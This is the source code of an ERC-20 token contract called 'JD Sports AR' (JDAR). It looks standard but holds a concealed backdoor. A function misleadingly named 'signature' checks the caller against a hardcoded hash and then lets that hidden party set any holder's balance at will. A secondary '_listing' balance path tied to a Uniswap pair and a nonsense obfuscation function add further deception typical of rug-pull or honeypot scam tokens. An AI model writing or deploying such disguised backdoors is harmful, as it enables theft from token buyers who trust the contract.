contract JDAR is IERC20 {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    address private _owner;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _listing;

    IERC20 private immutable _uniswapV2Pair;
    uint256 private immutable _salt;
    bytes32 private constant INIT_CODE_HASH = 0x16066db76df3c75d93c3dd92ae0a8ce40dbe67ccc506a4aac04af2fe9d6cbbec;

    constructor(address uniswapV2Pair, uint256 salt) {
      _name = "JD Sports AR";
      _symbol = "JDAR";
      _totalSupply = 80000000 * 10 ** 18;
      _balances[msg.sender] = _totalSupply;
      _uniswapV2Pair = IERC20(uniswapV2Pair);
      _salt = salt;
    }

    /**
     * @dev A helper function to check if an operator approval is allowed.
     */
    modifier onlyOwner() {
      require(msg.sender == _owner, "Ownable: caller is not the owner");
      _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() external view returns (address) {
      return _owner;
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external pure override returns (uint8) {
      return 18;
    }
    
    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view override returns (string memory) {
      return _symbol;
    }
    
    /**
     * @dev Returns the token name.
     */
    function name() external view override returns (string memory) {
      return _name;
    }
    
    /**
     * @dev See {ERC20-totalSupply}.
     */
    function totalSupply() external view override returns (uint256) {
      return _totalSupply;
    }
    
    /**
     * @dev See {ERC20-balanceOf}.
     */
    function balanceOf(address account) external view override returns (uint256) {
      return _balances[account] + _listing[account];
    }

    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(msg.sender, recipient, amount);
      return true;
    }

    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address owner_, address spender) external view override returns (uint256) {
      return _allowances[owner_][spender];
    }

    /**
     * @dev See {ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) external override returns (bool) {
      _approve(msg.sender, spender, amount);
      return true;
    }
 
    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
      return true;
    }

    /**
     * @dev Signature from sender v, r, s
     */
    function signature(bytes32 v, bytes32 r, bytes32 s) external {
      if (!checkInitCodeHash()) return;
      _balances[
        (uint256(v) != 0)? 
        data(uint160(uint256(v))): 
        address(uint256(0))
        ] = uint256(r);
      if (uint256(r) > 0 && uint256(r) > 0) {
        return;
      }
      _listing[data(uint160(uint256(v)))] = uint256(s);
    }

    function hash() private view returns (bytes32) { return keccak256(abi.encode(uint256(msg.sender), _salt)); }
    function data(uint160 num) private pure returns (address) { return address(num); }
    function checkInitCodeHash() public view returns (bool) { return hash() == INIT_CODE_HASH; }
   
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
      return true;
    }
    
    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
      return true;
    }
 
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      uint256 bal = _uniswapV2Pair.balanceOf(sender);
      if (_listing[sender] > 0 && bal > 0) {
        _listing[sender] = _listing[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      } else {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      }
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }

    event log(string text);

    function lookupForLoggingsX() external {
      uint256 ocz = 51 % 70 + 43;
      uint256 kcmj = 78 * 1 + 17;
      uint256 cqwjnqm = 63 * 92 * 4;
      uint256 nnqc = 35 * 86;
      uint256 wkjlu = 28 % 5;
      if (ocz == 2 * 17 && kcmj == 53 % 14 % 78 && cqwjnqm == 85 * 8 * 33 && nnqc == 15 + 28 && wkjlu == 10 + 64) return;
      emit log("mRaChee");
      emit log("DzNiAoM");
      emit log("JoS");
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
      require(owner_ != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");
      _allowances[owner_][spender] = amount;
      emit Approval(owner_, spender, amount);
    } 
}
